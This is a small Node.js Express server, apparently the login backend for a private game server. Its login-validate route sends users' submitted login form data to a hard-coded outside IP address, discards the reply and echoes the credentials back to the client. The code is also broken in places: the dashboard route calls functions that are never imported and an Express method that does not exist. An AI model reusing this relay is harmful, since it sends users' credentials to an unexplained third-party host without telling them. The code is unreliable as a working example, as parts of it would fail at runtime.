const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const rateLimiter = require('express-rate-limit');
const compression = require('compression');
const path = require('path');

app.use(
    compression({
        level: 5,
        threshold: 0,
        filter: (req, res) => {
            if (req.headers['x-no-compression']) {
                return false;
            }
            return compression.filter(req, res);
        }
    })
);

app.set('trust proxy', 1);
app.use(function (req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    console.log(`[${new Date().toLocaleString()}] ${req.method} ${req.url} - ${res.statusCode}`);
    next();
});
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(rateLimiter({ windowMs: 15 * 60 * 1000, max: 100, headers: true }));

app.post('/player/login/dashboard', function (ctx) {
    const html = readFileSync(
      join(__dirname, "public", "html","dashboard.html"),
      "utf-8",
    );
    return ctx.html(html);
});

app.post('/player/growid/login/validate', async (req, res) => {
    try {
        const response = await fetch('https://5.39.13.31/player/growid/login/validate', {
            method: 'POST',
            headers: {
                Referer: 'https://5.39.13.31/player/login/dashboard',
                Origin: 'https://5.39.13.31'
            },
            body: new URLSearchParams(req.body)
        });

        const text = await response.text();
        res.send(req.body);
    } catch (err) {
        console.log(err);
        res.status(500).send('proxy error');
    }
});

app.get('/favicon.:ext', function (req, res) {
    res.sendFile(path.join(__dirname, 'public', 'favicon.ico'));
});

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(5000, function () {
    console.log('Listening on port 5000');
});
